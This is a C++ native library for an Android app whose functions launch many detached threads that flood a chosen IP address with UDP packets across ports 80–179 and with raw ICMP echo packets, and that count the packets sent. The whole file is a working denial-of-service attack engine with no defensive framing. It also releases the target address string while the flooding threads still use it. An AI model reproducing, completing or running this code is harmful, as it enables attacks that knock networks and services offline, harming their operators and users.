#include <jni.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <cstring>
#include <signal.h>

std::atomic<bool> isAttacking{false};
std::atomic<uint64_t> packetCount{0};

void udpFlood(const char* targetIp, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;
    
    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_NO_CHECK, &optval, sizeof(optval));
    int sndbuf = 8388608;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int tos = 0x10; // IPTOS_THROUGHPUT
    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, targetIp, &dest.sin_addr);

    char payload[1400];
    memset(payload, 'T', sizeof(payload));
    uint64_t localCount = 0;

    while (isAttacking.load(std::memory_order_relaxed)) {
        ssize_t sent = sendto(sock, payload, sizeof(payload), 0, (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) localCount++;
        else if (sent < 0 && errno != EAGAIN && errno != EWOULDBLOCK) break;
    }
    packetCount.fetch_add(localCount, std::memory_order_relaxed);
    close(sock);
}

void icmpFlood(const char* targetIp) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;
    
    int sndbuf = 8388608;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, targetIp, &dest.sin_addr);

    char packet[sizeof(struct icmphdr) + 1400];
    memset(packet, 0, sizeof(packet));
    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = htons(1337);
    icmp->un.echo.sequence = htons(1);
    uint64_t localCount = 0;

    while (isAttacking.load(std::memory_order_relaxed)) {
        ssize_t sent = sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) localCount++;
        else if (sent < 0 && errno != EAGAIN && errno != EWOULDBLOCK) break;
    }
    packetCount.fetch_add(localCount, std::memory_order_relaxed);
    close(sock);
}

extern "C" JNIEXPORT void JNICALL
Java_com_twks_wifi_NativeEngine_startAttack(JNIEnv* env, jobject, jstring targetIp, jint threads) {
    isAttacking.store(true, std::memory_order_release);
    packetCount.store(0, std::memory_order_release);
    
    const char* ip = env->GetStringUTFChars(targetIp, nullptr);
    if (!ip) return;
    
    signal(SIGPIPE, SIG_IGN);

    int udpThreads = (threads * 7) / 10;
    int icmpThreads = threads - udpThreads;

    // detached threads — не блокируют JNI вызов
    for (int i = 0; i < udpThreads; i++) {
        std::thread t(udpFlood, ip, 80 + (i % 100));
        t.detach();
    }
    for (int i = 0; i < icmpThreads; i++) {
        std::thread t(icmpFlood, ip);
        t.detach();
    }

    env->ReleaseStringUTFChars(targetIp, ip);
}

extern "C" JNIEXPORT void JNICALL
Java_com_twks_wifi_NativeEngine_stopAttack(JNIEnv*, jobject) { 
    isAttacking.store(false, std::memory_order_release);
}

extern "C" JNIEXPORT jlong JNICALL
Java_com_twks_wifi_NativeEngine_getPacketCount(JNIEnv*, jobject) { 
    return packetCount.load(std::memory_order_acquire);
}
